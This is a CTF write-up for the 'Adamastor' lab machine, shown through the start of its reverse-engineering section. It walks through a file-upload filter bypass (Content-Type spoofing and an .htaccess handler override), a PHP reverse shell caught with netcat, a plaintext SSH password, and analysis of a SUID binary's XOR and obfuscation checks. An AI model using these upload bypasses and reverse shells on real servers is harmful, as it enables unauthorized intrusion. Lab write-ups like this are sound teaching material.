# Official Write-Up for Adamastor

For our challenge we will set up a local domain name called `adamastor.xyz` on our attacker machine that will be pointing to the target IP.

To do the same just edit with `sudo` or as `root` the file `/etc/hosts` by adding this line at the end of the file: `<IP_OF_TARGET_MACHINE> adamastor.xyz`.

## Scanning / Enumerating the target

### Nmap

We first start by scanning our target like this:

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- adamastor.xyz 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 01:24 EDT
Nmap scan report for adamastor.xyz (192.168.67.130)
Host is up (0.00054s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ef:fc:5b:d3:cb:5e:70:46:8a:87:d7:2c:17:10:ef:e3 (ECDSA)
|_  256 fe:7d:8a:94:24:da:46:cb:79:4f:b2:bd:ad:96:3c:4d (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: False Bay
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.97 seconds
```

Alright, from what we can see from the output, we're having two ports open, `22` for `ssh` and `80` hosting an `Apache` service!

Let's dig straight into the second port !

### Web / Gaining Foothold

When fetching the homepage of the website we got this:

![image](https://github.com/z0ne323/Adamastor/assets/80288433/e2cc7478-c147-4bd6-8016-ea7a8276d331)

Nice, the homepage is already giving us another path to check, no need to do directory fuzzing for now!

If we go to the path provided, we got this:

![image](https://github.com/z0ne323/Adamastor/assets/80288433/27bead53-5b50-4847-8a78-96775ce8d05b)

Looks like we might have a file upload vulnerability in front of us, let's try to upload a regular image to check the normal response and then a malicious file to compare the results.

[*] When uploading a normal image we get this:

![Recording 2024-03-28 234229](https://github.com/z0ne323/Adamastor/assets/80288433/bc6c38c9-911c-4ba3-8144-77791154dec1)

[*] When uploading a malicious file we get this:

![Recording 2024-03-28 234736](https://github.com/z0ne323/Adamastor/assets/80288433/284a146b-016e-4fcf-9e0c-b832d6457b64)

Alright so from these two actions we can assume two things from our `upload.php`, since the validation is done on server-side, it seems that:

1) The server is expecting an image
2) The server don't seem to accept `.php` file, or at least no such extension

After some testing, we were able to bypass the first check the server is implementing. It seems that when we actually upload a file, the server believe the `Content-Type` header we're sending, without actually validating the file type. 

[*] I'll showcase this first bypass with a `.txt` file that shouldn't normally be accepted. If I repeat my request with BurpSuite it seems I'm able to upload a `.txt` file by just changing the `Content-Type` header!

![Recording 2024-03-28 235826](https://github.com/z0ne323/Adamastor/assets/80288433/825c52f6-c997-431b-9019-95f2d9ca7bc0)

After we found our first bypass, we still can't upload `.php` file though. 
After some research on the Burp Academy website we find one type of vulnerability that we might be able to exploit, you can find this vulnerability [here](https://portswigger.net/web-security/file-upload#overriding-the-server-configuration) and a practical lab [there](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

Basically, the second bypass we will use to get our malicious file on the server will be to find a way to make an upload without the actual `.php` extension. 
If we assume that there is some black-filtering in place for our `.php` extension, one of the way we could bypass this will be by overriding the server configuration. 
To do so we will need to follow these two steps:

1) Upload an `.htaccess` file to the server, that will allow us to load a directory-specific configuration file that will map an arbitrary extension (for example `.l33t`) to the executable MIME type `application/x-httpd-php`.
Doing so will allow us to execute any file the server will found with the custom extension of our choice (in our case `.l33t`) as `.php` file. (also when uploading the `.htaccess`, don't forget to change the `Content-Type` to `image/jpeg`!)
The content of our `.htaccess` shoud look like this:

```
┌──(kali㉿kali)-[~]
└─$ cat .htaccess                                            
AddType application/x-httpd-php .l33t
```

2) The second step, after we successfully upload our `.htaccess` file, will simply be to rename our `php-reverse-shell.php` to `php-reverse-shell.l33t` and upload it
(again, don't forget to change the `Content-Type` to `image/jpeg` and just in case don't forget also to change within the `.l33t` file the `$ip` variable with your attacker machine IP and the `$port` variable with the port you'd like to listen on !) 

[*] The complete upload process will look like this in BurpSuite:

![Recording 2024-03-29 004517](https://github.com/z0ne323/Adamastor/assets/80288433/dcb5e3bb-0385-4acb-a508-470b04d9e94c)

Alright, nice ! Now that our reverse shell got uploaded on the server, we still need to find the directory where the files are getting uploaded, but before fuzzing the website for directories, let's set up a listener on the port we configured within our reverse shell. 
I'll do it like that:

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888          
listening on [any] 8888 ...
```

Then as we saw from the homepage, let's use `feroxbuster` to find our directory like so:

```
┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://adamastor.xyz --wordlist /usr/share/wordlists/dirb/big.txt
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://adamastor.xyz
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1511l     7329w   614888c http://adamastor.xyz/bugs_bunny.png
301      GET        9l       28w      332c http://adamastor.xyz/Database_Administration => http://adamastor.xyz/Database_Administration/
200      GET      827l     5550w   521692c http://adamastor.xyz/Database_Administration/Lion.jpg
200      GET      308l     3069w   238577c http://adamastor.xyz/adamastor_logo.ico
200      GET       27l       99w      888c http://adamastor.xyz/
200      GET        1l        4w       16c http://adamastor.xyz/Database_Administration/test.txt
[####################] - 8s     20477/20477   0s      found:6       errors:1      
[####################] - 5s     20469/20469   3769/s  http://adamastor.xyz/ 
[####################] - 7s     20469/20469   2922/s  http://adamastor.xyz/Database_Administration/ => Directory listing 
```

BINGO ! The directory is called `Database_Administration` and just using feroxbuster to fuzz directories actually triggered our reverse shell, look!

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888          
listening on [any] 8888 ...
connect to [192.168.67.132] from (UNKNOWN) [192.168.67.130] 58750
Linux adamastor 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 06:50:11 up  1:42,  0 users,  load average: 0.14, 0.14, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
### Enumerating the machine

Now that we're inside just doing a simple `ls` show us an interesting file, with something inside:

```
$ ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
t4k3_th1s_p4ssw0rd_l4st_34sy_th1ng_y0ull_s33_before_g01ng_NUTS.txt
tmp
usr
var
$ cat t4k3_th1s_p4ssw0rd_l4st_34sy_th1ng_y0ull_s33_before_g01ng_NUTS.txt
[*] ssh password for luis => 1u15c23473d4d4m45702
```

It seems we can connect through `ssh` with a user called `luis` and the password set as `1u15c23473d4d4m45702`, let's try !

```
┌──(kali㉿kali)-[~]
└─$ ssh luis@adamastor.xyz  
The authenticity of host 'adamastor.xyz (192.168.67.130)' can't be established.
ED25519 key fingerprint is SHA256:5CgE+jEvt7BMRqFGOOO0QF+9FoX5tq3QY75pyu42dm4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'adamastor.xyz' (ED25519) to the list of known hosts.
luis@adamastor.xyz's password: 
##################################################
#      .-``'.       BRACE !!!       .'''-.       #
#    .`   .` ~ A wave is coming... ~ `.   '.     #  
#_.-'     '._      - r0de0 -        _.'     '-._ #
##################################################
luis@adamastor:~$
```

Nice we got a stable shell ! Time to look for a way to escalate our privileges, when listing the home directory we found this:

```
luis@adamastor:~$ ls -latr
total 56
-rw-r--r-- 1 luis luis   807 Jan  6  2022 .profile
-rw-r--r-- 1 luis luis   220 Jan  6  2022 .bash_logout
drwxr-xr-x 3 root root  4096 Mar 19 18:52 ..
drwx------ 2 luis luis  4096 Mar 19 18:52 .ssh
drwx------ 2 luis luis  4096 Mar 19 19:08 .cache
lrwxrwxrwx 1 luis luis     9 Mar 19 19:09 .bash_history -> /dev/null
-rw-r--r-- 1 luis luis  3831 Mar 19 19:21 .bashrc
drwxrwxr-x 3 luis luis  4096 Mar 19 19:33 .local
-rwsr-sr-x 1 root root 17424 Mar 19 19:37 adamastor
-rw-rw-r-- 1 luis luis   183 Mar 19 19:39 README_BEFORE_STARTING.TXT
drwxr-x--- 5 luis luis  4096 Mar 19 19:39 .
luis@adamastor:~$ cat README_BEFORE_STARTING.TXT
[*] NEVER FORGET: Things aren't always as they seem, even in the storm. Now, it's your time to reach Adamastor, the only thing left is to wish you a good luck in this adventure... :)
```

Alright we got a nice `README` but more importantly a binary with the `SUID` bit set! Let's privesc !

## Privilege escalation (Intented way)

When looking at the binary, we quickly notice that the typical attacks involving files with the SUID bit set like hijacking relative paths won't work for us. 
We're definitely in front of a reverse engineering challenge, to continue let's copy the file back to our attacker machine:

On the target machine host a temporary http server:
```
luis@adamastor:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On the attacker one, grab the file:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ wget http://adamastor.xyz:8000/adamastor
--2024-03-29 03:07:12--  http://adamastor.xyz:8000/adamastor
Resolving adamastor.xyz (adamastor.xyz)... 192.168.67.130
Connecting to adamastor.xyz (adamastor.xyz)|192.168.67.130|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17424 (17K) [application/octet-stream]
Saving to: ‘adamastor’

adamastor                                            100%[====================================================================================================================>]  17.02K  --.-KB/s    in 0s      

2024-03-29 03:07:12 (44.3 MB/s) - ‘adamastor’ saved [17424/17424]

                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ ls -latr
total 324
-rw-r--r--  1 kali kali  17424 Mar 19 15:37 adamastor
-rw-r--r--  1 kali kali 287563 Mar 29 01:35 Lion.jpg
-rwxr-xr-x  1 kali kali   5496 Mar 29 01:38 php-reverse-shell.php
-rw-r--r--  1 kali kali     16 Mar 29 01:55 test.txt
drwx------ 27 kali kali   4096 Mar 29 03:05 ..
drwxr-xr-x  2 kali kali   4096 Mar 29 03:07 .
```

Okay, amazing, now that we got our file, let's make it executable and try to run it:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ chmod +x adamastor       
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ ./adamastor         
[-] Usage: ./adamastor <hex_input>
```

Nothing interesting so far, it seems we need to provide an argument more specifically an `hexadecimal` input from what the program tells us, let's do this:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./adamastor abcdef  
[-] Try again! (XOR result: 129F9B97)
```

Alright, we do get some interesting results here, let's try to run the program in our debugger and analyze the functions like so:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ r2 -d adamastor abcdef  
[0x7f4fa5d11360]> aaa
[af: Cannot find function at 0x601355deb946b000try0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7f4fa5d11360]> afl
[0x7f4fa5d11360]> 
```

Alright if you're getting lost already, no worries, I'll explain what I just done, so basically using a popular debugger program called `radare2` (`r2` is just the short version of the command in CLI), I do the following steps:

1) Executing the program with the same argument we used before, but in debugging mode, thus using the `-d` flag when using `r2` like so: `r2 -d adamastor abcdef`
2) When inside `r2` prompt, using the command `aaa` (stands for "analyze all") will performs various analysis tasks on the functions within the current program (in our case `adamastor`)
3) Last but not least I used the command `afl` (stands for "analyze functions list") to list all the functions found in the analyzed binary along with their addresses and sizes.

You can download the program through `apt` like so: `sudo apt install radare2` or compile it manually thanks to the repo [here](https://github.com/radareorg/radare2)

If you want more infos, because this overview was quite fast, you can check `r2` documentation [here](https://book.rada.re/). 

But as I said in the third part, `afl` command is supposed to display our function names but weirdly we don't see anything getting out of our prompt, let's get out of `r2` for now and check the file type, it's weird...

```
[0x7f4fa5d11360]> exit
Do you want to quit? (Y/n) y
Do you want to kill the process? (Y/n) y
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ file adamastor 
adamastor: ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)
```

Interesting, when checking the file type, it seems we're getting an error thrown at us, this is not at **ALL** normal. Alright when googling exactly this: `ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)`, we end up quickly on this article [here](https://pentester.blog/?p=247)

Within it, a part catch my attention:

![image](https://github.com/z0ne323/Adamastor/assets/80288433/04cc31d8-27a5-4fd2-9e1c-6a147514bd42)

It seems that it's possible to modify our ELF header bytes without actually impacting the execution flow, but it allows the binary to be protected with some "simple" anti-reverse engineering protection. 

To fix this issue, it seems we might be able to use a tool like hexeditor, to change the 6th byte from `02` (`MSB`) to `01` (`LSB`) and that should normally get the program back in it's "normal" mode. 

If you're again completely lost, it's super okay, I recommend this article just [here](https://en.wikipedia.org/wiki/Bit_numbering) from Wikipedia to learn more about `LSB` and `MSB`. 

If you're curious about how does that apply in the context of `ELF` binary, I could also recommend this incredible article just [there](https://medium.com/@MrJamesFisher/understanding-the-elf-4bd60daac571)

Alright let's apply this technique now using a tool called `hexeditor`:

![Recording 2024-03-29 004517](https://github.com/z0ne323/Adamastor/assets/80288433/74c4dd3d-70c0-4129-b609-2f11988701f8)

Looks like it worked, we could technically open the file back in `r2` and see everything from there but let's keep `r2` for later, I want to show you another **INCREDIBLE** tool we can use from our toolbox to solve this challenge, let's use `Ghidra` !

You can install Ghidra by getting the repo to your machine. You can find the GitHub repo [here](https://github.com/NationalSecurityAgency/ghidra)

If you want to learn more about the tool itself, some interesting ressources are being given on the official website [here](https://ghidra-sre.org/)

Alright so in `Ghidra` if you want to set up a project, open `adamastor` and analyze it, it's pretty straightforward but I'll still show you all the steps just in case, no worries:

![Recording 2024-03-29 015336](https://github.com/z0ne323/Adamastor/assets/80288433/bd7f5b1a-8bc6-4db6-9fbf-d9ac829773e7)

In the end, you can see that I'm going in the window section called `Symbol Tree` in `Ghidra` and search `main`, that basically allows me to look up the main function and open it in the window on the right that shows the decompiled code (C-like type of output if you want, more readable than assembly instructions!)

Another nice thing to note about the `Symbol Tree` window in `Ghidra` is the Functions folder that will list every function from your program, I'll show you in the context of Adamastor:

![Recording 2024-03-29 015336](https://github.com/z0ne323/Adamastor/assets/80288433/bfeaae3b-1eab-46b0-ab1f-54444abeb244)

Alright so the decompiled code for the main function look like this (don't be scared promise it's going to be fine):

```C
undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  undefined8 uVar2;
  char *__nptr;
  long in_FS_OFFSET;
  uint local_e4;
  uint local_e0;
  int local_dc;
  ulong local_d8;
  char *local_d0;
  ulong local_c8;
  char *local_c0;
  undefined *local_b8;
  char *local_b0;
  char *local_a8;
  undefined *local_a0;
  char *local_98 [2];
  undefined8 local_83;
  undefined2 local_7b;
  undefined local_79;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined4 local_58;
  undefined local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 != 2) {
    printf("[-] Usage: %s <hex_input>\n",*param_2);
    uVar2 = 1;
    goto LAB_00101d87;
  }
  iVar1 = check_length_input(param_2[1],8);
  if (iVar1 == 1) {
    uVar2 = 1;
    goto LAB_00101d87;
  }
  iVar1 = __isoc99_sscanf(param_2[1],&DAT_00102153,&local_e4);
  if (iVar1 != 1) {
    puts("[-] Invalid hexadecimal input.");
    uVar2 = 1;
    goto LAB_00101d87;
  }
  local_e0 = local_e4 ^ 0x12345678;
  if (local_e0 == 0xdeadbeef) {
    puts("[+] Congratulations! You\'ve passed the XOR challenge.");
    local_83 = 0x666b76514e38323d;
    local_7b = 0x5230;
    local_79 = 0;
    obfuscate_function(&local_83);
    printf("[*] Now, provide an input for the second challenge: ");
    local_d0 = (char *)get_input();
    iVar1 = check_length_input(local_d0,10);
    if (iVar1 == 1) {
      uVar2 = 1;
      goto LAB_00101d87;
    }
    iVar1 = strncmp(local_d0,(char *)&local_83,10);
    if (iVar1 == 0) {
      free(local_d0);
      puts("[+] Well done! You\'ve passed the obfuscation challenge.");
      local_98[0] = "DATA_DETAILS_01";
      local_98[1] = "DATA_DETAILS_02";
      local_c8 = 2;
      for (local_d8 = 0; local_d8 < local_c8; local_d8 = local_d8 + 1) {
        iVar1 = check_environment_variable(local_98[local_d8]);
        if (iVar1 == 0) {
          printf("[-] Environment variable %s does not exist.\n",local_98[local_d8]);
          goto LAB_00101d35;
        }
      }
      local_c0 = getenv(local_98[0]);
      __nptr = getenv(local_98[1]);
      local_dc = atoi(__nptr);
      if ((local_c0 == (char *)0x0) || (local_dc == 0)) {
        puts("[-] Error: Environment variables not properly set.");
      }
      else {
        receive_data(local_c0,local_dc,local_48,0x31);
        local_b8 = local_48;
        local_78 = 0x6678687565656b54;
        local_70 = 0x4a6f61586a63416a;
        local_68 = 0x486868466b786667;
        local_60 = 0x7276746a47716878;
        local_58 = 0x74736c;
        local_b0 = (char *)guess_the_cipher_my_friend(&local_78,local_b8);
        printf("[*] Finally, provide an input for the last challenge: ");
        local_a8 = (char *)get_input();
        iVar1 = check_length_input(local_a8,0x23);
        if (iVar1 != 1) {
          iVar1 = strncmp(local_a8,local_b0,0x23);
          if (iVar1 == 0) {
            free(local_a8);
            puts("[+] Well done! You\'ve passed the final challenge!");
            get_shell();
            local_a0 = &DAT_00102318;
            puts(&DAT_00102318);
          }
          else {
            printf("[-] Try again! Wrong input: %s\n",local_a8);
            free(local_a8);
          }
          goto LAB_00101d82;
        }
      }
LAB_00101d35:
      uVar2 = 1;
      goto LAB_00101d87;
    }
    printf("[-] Try again! Wrong input: %s\n",local_d0);
    free(local_d0);
  }
  else {
    printf("[-] Try again! (XOR result: %X)\n",(ulong)local_e0);
  }
LAB_00101d82:
  uVar2 = 0;
LAB_00101d87:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
Alright so if you survived so far, I promise you can get through this too, to make it easier, we will take small parts of this program and analyze it together. 

The first thing we can isolate from this **BIG** block of code (that we technically already passed by the way!) is this part:

```C
if (param_1 != 2) {
    printf("[-] Usage: %s <hex_input>\n",*param_2);
    uVar2 = 1;
    goto LAB_00101d87;
  }
  iVar1 = check_length_input(param_2[1],8);
  if (iVar1 == 1) {
    uVar2 = 1;
    goto LAB_00101d87;
  }
  iVar1 = __isoc99_sscanf(param_2[1],&DAT_00102153,&local_e4);
  if (iVar1 != 1) {
    puts("[-] Invalid hexadecimal input.");
    uVar2 = 1;
    goto LAB_00101d87;
  }

```

To go over it fast but still make it understandable, these three `if` conditions basically check the argument provided when we run the program in three ways:

1) Check if we provide an argument in the first place
2) Check if our argument is respecting our required length (that we actually set through the function `check_length_input()` by providing the variable storing our argument, `param_2[1]` and the "allowed" size, `8` in our context)
3) Last but not least the last check is pretty verbose, it just check if our argument is a valid hexadecimal value !

You see ? If we take smaller parts of the program and analyze them individually, it becomes way easier! It's a good rule to operate this way during these type of challenges to successfully keep track of your own analysis and also to not end up lost / in rabbit holes !

Alright let's move on to the next check !

#### XOR Challenge

(I didn't put the entire if / else case condition, we only need the first part!)
```C
local_e0 = local_e4 ^ 0x12345678;
  if (local_e0 == 0xdeadbeef) {
    puts("[+] Congratulations! You\'ve passed the XOR challenge.");
```
Alright this one seems a little bit more tricky right ? Well not really again if we stay focus, it does make sense, the first line we see in this snippet is a variable called `local_e0` getting initialized.

It seems to hold the result of a mathematical operation between the variable `local_e4` and the hexadecimal value `0x12345678`. But what is the value of `local_e4` ??

Well actually, if you look at our previous code snippet you'll see this line: `iVar1 = __isoc99_sscanf(param_2[1],&DAT_00102153,&local_e4);`. 

The `&` operator is used to pass the address of `local_e4` to `sscanf()`, allowing the function to directly modify the value of `local_e4`, if you're not sure what I'm talking about, I'll recommend to check [here](https://www.w3schools.com/c/c_memory_address.php).

As we know it, right aftr `iVar1` is getting re-initialized, we actuallly use it to check our input (Check the first snippet if you're confused). 

So we can safely assume, with all the elements at hands, that when we're actually providing an argument when executing the program, it's actually getting stored in the variable `local_e4`.

Alright now that we understood what `local_e4` was, let's get back to our second snippet, so if you remember correctly, the value of `local_e0` is the result of the mathematical operation from two variables, `local_e4` (our input) and an hexadecimal value, `0x12345678`.

But this operation is being completed with a strange operator: `^`, the last line of the second snippet (`puts` line) actually gives us a hint about what that might be, it's probably a `XOR` operation and it's getting represented by this character: `^` !

Another way we could dynamically validate this finding will be by looking back when we executed the program with the hex value, when we got that error it's actually giving us the results we created from our input, rememember ? :

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./adamastor abcdef         
[-] Try again! (XOR result: 129F9B97)
```

So if for example, we use python to check our input and `xor` it with the hexadecimal value `0x12345678`, we should normally end up on the results provided by the program. Let's check our theory:

```python
┌──(kali㉿kali)-[~/Desktop]
└─$ python3           
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xabcdef ^ 0x12345678)
'0x129f9b97'
```

BINGO ! That's the value getting in the output of our program, that means we're definitely checking the right part ! 
(Quick side note, I use the notation `0x` within python to make sure the interpreter is treating these values as hexadecimal, but we don't need it in the program since it knows it's hexadecimal !)

The last thing we need to look at before closing the first challenge is the value expected from this mathematical operation. 
A check is being made right after. If you look back at the snippet, `local_e0` has to be equal to the hexadecimal value `0xdeadbeef`. 
So to move on to the rest of the program, we need to know what's the expected value we're suppose to provide (in `local_e4`) to basically produce this hexadecimal value of `0xdeadbeef`.

But guess what, with some research, you can realize pretty fast that in an XOR operation, if you know one of the operands and the result, you can calculate the other operand by XOR-ing the result with the known operand. 
This property of XOR makes it in fact possible to reverse any operations. So to make it more simple, to get our expected value we're going to do: `local_e4 = 0xdeadbeef ^ 0x12345678`.

This should gives us the expected value for the first challenge, let's head back to our python interpreter and do this operation !

```python
>>> hex(0xdeadbeef ^ 0x12345678)
'0xcc99e897'
```
BINGO we got something, let's try it ! Rememeber we don't actually need the `0x` thing it's just the way for python to let us know (and the program) that this value is in hexadecimal!

Let's try to run our program again with the right argument this time:

```c
┌──(kali㉿kali)-[~/Desktop]
└─$ ./adamastor cc99e897
[+] Congratulations! You've passed the XOR challenge.
[*] Now, provide an input for the second challenge:
```

[+] We move on to the next challenge !!

(If you'd like more context / ressource about `XOR` feel free to check [here](https://www.loginradius.com/blog/engineering/how-does-bitwise-xor-work/)

#### Obfuscation Challenge

Alright for this one, we will get back to `r2`, let's practice a little ! So same as before we open the program in debug mode (with our first flag !), then we "analayze all", to finally list the functions, it looks like this:

```assembly
┌──(kali㉿kali)-[~/Desktop]
└─$ r2 -d adamastor cc99e897
[0x7f6362b1c360]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7f6362b1c360]> afl
0x55b3abbec360    1 38           entry0
0x55b3abbeefd8    1 4129         reloc.__libc_start_main
0x55b3abbec390    4 41   -> 34   sym.deregister_tm_clones
0x55b3abbec3c0    4 57   -> 51   sym.register_tm_clones
0x55b3abbec400    5 57   -> 54   sym.__do_global_dtors_aux
0x55b3abbec1c0    1 11           fcn.55b3abbec1c0
0x55b3abbec440    1 9            entry.init0
0x55b3abbec65c   12 336          sym.receive_data
0x55b3abbec449    3 66           sym.check_length_input
0x55b3abbecda0    1 13           sym._fini
0x55b3abbec7ac    9 342          sym.guess_the_cipher_my_friend
0x55b3abbec48b    4 151          sym.obfuscate_function
0x55b3abbec591   12 203          sym.check_environment_variable
0x55b3abbec939   30 1124         main
0x55b3abbec902    1 55           sym.get_shell
0x55b3abbec210    1 11           sym.imp.puts
0x55b3abbec330    1 11           sym.imp.setuid
0x55b3abbec240    1 11           sym.imp.system
0x55b3abbec000    3 27           sym._init
0x55b3abbec522    3 111          sym.get_input
0x55b3abbec2b0    1 11           sym.imp.malloc
0x55b3abbec320    1 11           sym.imp.fwrite
0x55b3abbec300    1 11           sym.imp.exit
0x55b3abbec2f0    1 11           sym.imp.__isoc99_scanf
0x55b3abbec1d0    1 11           sym.imp.getenv
0x55b3abbec1e0    1 11           sym.imp.free
0x55b3abbec1f0    1 11           sym.imp.recv
0x55b3abbeb000    3 126  -> 181  sym.imp.__libc_start_main
0x55b3abbec200    1 11           sym.imp.strncmp
0x55b3abbec220    1 11           sym.imp.strlen
0x55b3abbec230    1 11           sym.imp.__stack_chk_fail
0x55b3abbec250    1 11           sym.imp.htons
0x55b3abbec260    1 11           sym.imp.strchr
0x55b3abbec270    1 11           sym.imp.printf
0x55b3abbec280    1 11           sym.imp.close
0x55b3abbec290    1 11           sym.imp.inet_pton
0x55b3abbec2a0    1 11           sym.imp.tolower
0x55b3abbec2c0    1 11           sym.imp.__isoc99_sscanf
0x55b3abbec2d0    1 11           sym.imp.perror
0x55b3abbec2e0    1 11           sym.imp.atoi
0x55b3abbec310    1 11           sym.imp.connect
0x55b3abbec340    1 11           sym.imp.__ctype_b_loc
0x55b3abbec350    1 11           sym.imp.socket
```

Now we got functions listed by `r2`, nice ! Let's disassemble main by executing this command (`pdf @main`) in the prompt:

```assembly
[0x7f6362b1c360]> pdf @main
Do you want to print 259 lines? (y/N) y
            ; DATA XREF from entry0 @ 0x55b3abbec378
┌ 1124: int main (int argc, char **argv);
│           ; var int64_t var_f0h @ rbp-0xf0
│           ; var int64_t var_e4h @ rbp-0xe4
│           ; var int64_t var_dch @ rbp-0xdc
│           ; var int64_t var_d8h @ rbp-0xd8
│           ; var int64_t var_d4h @ rbp-0xd4
│           ; var int64_t var_d0h @ rbp-0xd0
│           ; var int64_t var_c8h @ rbp-0xc8
│           ; var int64_t var_c0h @ rbp-0xc0
│           ; var int64_t var_b8h @ rbp-0xb8
│           ; var int64_t var_b0h @ rbp-0xb0
│           ; var int64_t var_a8h @ rbp-0xa8
│           ; var int64_t var_a0h @ rbp-0xa0
│           ; var int64_t var_98h @ rbp-0x98
│           ; var int64_t var_90h @ rbp-0x90
│           ; var int64_t var_88h @ rbp-0x88
│           ; var int64_t var_7bh @ rbp-0x7b
│           ; var int64_t var_73h @ rbp-0x73
│           ; var int64_t var_71h @ rbp-0x71
│           ; var int64_t var_70h @ rbp-0x70
│           ; var int64_t var_68h @ rbp-0x68
│           ; var int64_t var_60h @ rbp-0x60
│           ; var int64_t var_58h @ rbp-0x58
│           ; var int64_t var_50h @ rbp-0x50
│           ; var int64_t var_40h @ rbp-0x40
│           ; var int64_t var_8h @ rbp-0x8
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x55b3abbec939      f30f1efa       endbr64
│           0x55b3abbec93d      55             push rbp
│           0x55b3abbec93e      4889e5         mov rbp, rsp
│           0x55b3abbec941      4881ecf00000.  sub rsp, 0xf0
│           0x55b3abbec948      89bd1cffffff   mov dword [var_e4h], edi ; argc
│           0x55b3abbec94e      4889b510ffff.  mov qword [var_f0h], rsi ; argv
│           0x55b3abbec955      64488b042528.  mov rax, qword fs:[0x28]
│           0x55b3abbec95e      488945f8       mov qword [var_8h], rax
│           0x55b3abbec962      31c0           xor eax, eax
│           0x55b3abbec964      83bd1cffffff.  cmp dword [var_e4h], 2
│       ┌─< 0x55b3abbec96b      742b           je 0x55b3abbec998
│       │   0x55b3abbec96d      488b8510ffff.  mov rax, qword [var_f0h]
│       │   0x55b3abbec974      488b00         mov rax, qword [rax]
│       │   0x55b3abbec977      4889c6         mov rsi, rax
│       │   0x55b3abbec97a      488d05b70700.  lea rax, str.____Usage:__s__hex_input__n ; 0x55b3abbed138 ; "[-] Usage: %s <hex_input>\n"                                                  
│       │   0x55b3abbec981      4889c7         mov rdi, rax
│       │   0x55b3abbec984      b800000000     mov eax, 0
│       │   0x55b3abbec989      e8e2f8ffff     call sym.imp.printf     ; int printf(const char *format)                                                                                   
│       │   0x55b3abbec98e      b801000000     mov eax, 1
│      ┌──< 0x55b3abbec993      e9ef030000     jmp 0x55b3abbecd87
│      │└─> 0x55b3abbec998      488b8510ffff.  mov rax, qword [var_f0h]
│      │    0x55b3abbec99f      4883c008       add rax, 8
│      │    0x55b3abbec9a3      488b00         mov rax, qword [rax]
│      │    0x55b3abbec9a6      be08000000     mov esi, 8
│      │    0x55b3abbec9ab      4889c7         mov rdi, rax
│      │    0x55b3abbec9ae      e896faffff     call sym.check_length_input
│      │    0x55b3abbec9b3      83f801         cmp eax, 1              ; 1
